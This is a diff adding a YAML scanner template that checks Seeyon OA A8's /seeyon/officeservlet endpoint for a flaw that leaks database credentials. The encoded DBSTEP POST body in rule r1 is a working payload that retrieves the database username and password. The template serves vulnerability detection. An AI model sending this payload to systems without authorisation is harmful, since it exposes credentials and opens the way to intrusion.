@@ -1,0 +1,36 @@
+id: seeyon-officeservlet-database-info-leak
+info:
+  name: seeyon officeservlet database info leak
+  author: ct
+  severity: high
+  description: |
+    致远OA A8 Officeservlet接口存在数据库账号密码读取漏洞
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /seeyon/officeservlet
+    expression: response.status == 200 && response.body.bcontains(b"saveFaile")
+   
+  r1:
+    request:
+      method: POST
+      path: /seeyon/officeservlet
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        DBSTEP V3.0     285             0               0              
+        RECORDID=wLoi
+        CREATEDATE=wLehP4whzUoiw=66
+        originalFileId=wLoi
+        needReadFile=yRWZdAS6
+        originalCreateDate=wLehP4whzUoiw=66
+        OPTION=LKDxOWOWLlxwVlOW
+        TEMPLATE=qf85qf85qfDfeazQqAzvcRevy1W3eazvNaMUySz3d7TsdRDsyaM3nYli
+        COMMAND=BSTLOlMSOCQwOV66
+        affairMemberId=wLoi
+        affairMemberName=wLoi
+    expression: response.status == 200 && response.body.bcontains(b"username") && response.body.bcontains(b"password")
+
+expression: r0() && r1()
